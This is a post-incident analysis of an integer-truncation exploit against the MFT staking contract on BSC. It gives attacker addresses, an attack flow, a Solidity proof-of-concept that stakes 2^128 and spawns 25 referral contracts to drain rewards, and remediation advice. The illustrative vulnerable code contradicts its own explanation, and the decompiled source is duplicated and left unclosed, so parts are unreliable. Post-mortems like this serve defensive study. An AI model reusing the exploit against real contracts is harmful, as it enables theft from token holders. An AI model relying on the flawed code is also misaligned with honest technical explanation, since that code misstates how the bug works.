# MFT — Integer Truncation Staking Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-15 |
| **Protocol** | MFT Token |
| **Chain** | BSC |
| **Loss** | ~33,700 USD |
| **Attacker** | [0x2bee9915](https://bscscan.com/address/0x2bee9915ddefdc987a42275fbcc39ed178a70aaa) |
| **Attack Tx** | [0xe24ee2af](https://bscscan.com/tx/0xe24ee2af7ceee6d6fad1cacda26004adfe0f44d397a17d2aca56c9a01d759142) |
| **Vulnerable Contract** | [0x29Ee4526](https://bscscan.com/address/0x29Ee4526e3A4078Ce37762Dc864424A089Ebba11) |
| **Root Cause** | Integer truncation bug in `stake()` — values ≥ 2^128 are truncated to 0, but the contract records them as a large stake |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/MFT_exp.sol) |

---
## 1. Vulnerability Overview

The `stake()` function of the MFT staking contract suffered an integer overflow when truncating the input amount to uint128. When an attacker stakes `2^128` (340282366920938463463374607431768211456), the actual tokens transferred are 0, but the contract records it as a large stake. By exploiting this, the attacker created 25 referrals and claimed a large amount of MFT rewards for free.

## 2. Vulnerable Code Analysis

```solidity
// ❌ MFT Staking: Integer truncation vulnerability
contract MFTStaking {
    struct StakeInfo {
        uint128 amount;  // ❌ stored as uint128
        // ...
    }

    function stake(uint256 amount) external {
        // ❌ truncation to uint128: values ≥ 2^128 become 0
        uint128 truncated = uint128(amount);  // 2^128 input → 0
        stakeInfo[msg.sender].amount += truncated;  // adds 0

        // ❌ but other logic uses the original amount (2^128)
        // → transferFrom(msg.sender, this, 0) executes (no actual transfer)
        // → stake record remains as a large stake
        IERC20(MFT).transferFrom(msg.sender, address(this), truncated);
    }
}

// ✅ Fix:
// require(amount <= type(uint128).max, "amount too large");
// or store as uint256 with overflow check
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: MFT_decompiled.sol
contract MFT {
contract MFT {
    address public owner;


    // Selector: 0x6795e10a
    function unknown_6795e10a() external {}  // ❌ vulnerability

    // Selector: 0xacb2ad6f
    function transferFee() external {}

    // Selector: 0xdd62ed3e
    function allowance(address p0, address p1) external view returns (uint256) {}

    // Selector: 0xe5a6b10f
    function currency() external {}

    // Selector: 0xea10510e
    function setAntiSYNCEnable(bool p0) external {}

    // Selector: 0xf2fde38b
    // Alternative: _SIMONdotBLACK_(int8[],uint256,address,bytes8,int96)
    function transferOwnership(address p0) external {}

    // Selector: 0xfeff84a8
    function setB(address p0, bool p1) external {}

    // Selector: 0xbcf63500
    function _startTime2() external {}

    // Selector: 0xce0192f9
    function _buyFundFee() external {}

    // Selector: 0xd49d5181
    function MAX() external {}

    // Selector: 0xd5986433
    function enableChangeTax() external {}

    // Selector: 0x715018a6
    function renounceOwnership() external {}

    // Selector: 0x8718b24f
    function _tokenDistributor() external {}

    // Selector: 0x8da5cb5b
    function owner() external view returns (address) {}

    // Selector: 0x95d89b41
    function symbol() external view returns (string memory) {}

    // Selector: 0xa9059cbb
    function transfer(address p0, uint256 p1) external {}

    // Selector: 0x67b3c1cb
    function _startTime1() external {}

    // Selector: 0x6ebcf607
    function _balances(address p0) external {}

    // Selector: 0x70a08231
    function balanceOf(address p0) external view returns (uint256) {}

    // Selector: 0x35c96089
    function antiSYNC() external {}

    // Selector: 0x48178a41
    function setStartTime2(uint256 p0) external {}

    // Selector: 0x49bd5a5e
    // 📌 Swap - price manipulation risk
    function uniswapV2Pair() external {}

    // Selector: 0x57f40fd4
    function setStartTime1(uint256 p0) external {}

    // Selector: 0x595dec3c
    function _blackList(address p0) external {}

    // Selector: 0x5ba5eb18
    function unknown_5ba5eb18() external {}

    // Selector: 0x3bfe62ca
    function _sellFundFee() external {}

    // Selector: 0x3c11100d
    // 📌 Swap - price manipulation risk
    function _swapPairList(address p0) external {}

    // Selector: 0x4188bf5a
    function _mainPair() external {}

    // Selector: 0x47240874
    function setWhite(address p0, bool p1) external {}

    // Selector: 0x15d07d82
    function currencyIsEth() external {}

    // Selector: 0x18160ddd
    function totalSupply() external view returns (uint256) {}

    // Selector: 0x206c17bb
    // Alternative: mulOrDiv(uint256,uint256)
    // 📌 Swap - price manipulation risk
    function _swapRouter() external {}

    // Selector: 0x23b872dd
    // 📌 Arbitrary transferFrom - approval validation required
    function transferFrom(address p0, address p1, uint256 p2) external {}

    // Selector: 0x313ce567
    function decimals() external view returns (uint8) {}

    // Selector: 0x01986fad
    function _feeWhiteList(address p0) external {}

    // Selector: 0x024c2ddd
    function _allowances(address p0, address p1) external {}

    // Selector: 0x06fdde03
    function name() external view returns (string memory) {}

    // Selector: 0x095ea7b3
    // 📌 approve - safeApprove race condition risk
    function approve(address p0, uint256 p1) external {}

    // Selector: 0x0dfe1681
    function token0() external view returns (address) {}

    // Selector: 0xd21220a7
    // Alternative: detectabilityAntiauthoritarianism(), join_tg_invmru_haha_a906df4(bool,bool), watch_tg_invmru_6092201(bool,address,uint256)
    function token1() external view returns (address) {}

    // Selector: 0x0902f1ac
    // Alternative: join_tg_invmru_haha_691357a(bool,bool,bool)
    function getReserves() external view returns (uint256) {}

    // Selector: 0xfff6cae9
    // Alternative: watch_tg_invmru_10b052bb(bool,address,bool)
    function sync() external {}

    // Selector: 0x791ac947
    // Alternative: join_tg_invmru_haha_2e12539(bool,uint256,address), _SIMONdotBLACK_(int16,uint168,bytes10[],bool,uint40[])
    // 📌 Swap - price manipulation risk
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 p0, uint256 p1, address[] memory p2, address p3, uint256 p4) external {}

    // Selector: 0x5c11d795
    // Alternative: watch_tg_invmru_77e6c68(uint256,bool,address)
    // 📌 Swap - price manipulation risk
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 p0, uint256 p1, address[] memory p2, address p3, uint256 p4) external {}

```

## 3. Attack Flow

```
Attacker (0x2bee9915)
  │
  ├─[1]─▶ register(sponsor) on MFT staking contract
  │
  ├─[2]─▶ stake(2^128)
  │         └─ ❌ uint128 truncation → actual transfer: 0 MFT
  │             but contract records as large stake
  │
  ├─[3]─▶ Loop: deploy 25 AttackContracts
  │         each calls register(this) + stake(2^128)
  │         → forms referral network
  │
  ├─[4]─▶ call claim(3, 1, 0)
  │         └─ large stake record + 25 referrals → claim rewards
  │
  └─[5]─▶ acquire large amount of MFT tokens → steal ~33,700 USD
```

## 4. PoC Code

```solidity
function testExploit() public balanceLog {
    IMatez matez = IMatez(MFT_TOKEN);

    address sponsor = 0x80d93e9451A6830e9A531f15CCa42Cb0357D511f;
    matez.register(sponsor);

    // ❌ stake 2^128: actual transfer is 0 due to uint128 truncation
    uint256 amount = 340282366920938463463374607431768211456;  // 2^128
    matez.stake(amount);

    // create 25 referrals
    for (uint256 i = 0; i < 25; i++) {
        new AttackContract(address(this), amount);
    }

    // claim rewards for free
    IMatez(MFT_TOKEN).claim(uint40(3), uint40(1), 0);
}

contract AttackContract {
    constructor(address sponsor, uint256 amount) {
        IMatez matez = IMatez(MFT_TOKEN);
        matez.register(sponsor);
        matez.stake(amount);  // each records large stake with 0 transfer
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Integer Truncation / Business Logic Vulnerability |
| **Attack Vector** | uint128 truncation overflow + reward claim |
| **CWE** | CWE-190: Integer Overflow |
| **DASP** | Business Logic Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Input range validation**: Add `require(amount <= type(uint128).max)`
2. **Consistent typing**: Unify staking amounts as uint256 or perform explicit overflow checks on conversion
3. **Stricter reward claim conditions**: Verify that the actual transferred amount matches the recorded amount
4. **Referral abuse prevention**: Enforce uniqueness per referral address and minimum stake requirements

## 7. Lessons Learned

- Integer truncation (`uint128(largeValue)`) can result in a value of 0, yet the staking record may retain the original large value.
- The amount of tokens actually transferred and the amount recorded internally must always be verified to match.
- When a referral mechanism is combined with a reward system, it becomes an amplifier for zero-cost or low-cost manipulation attacks.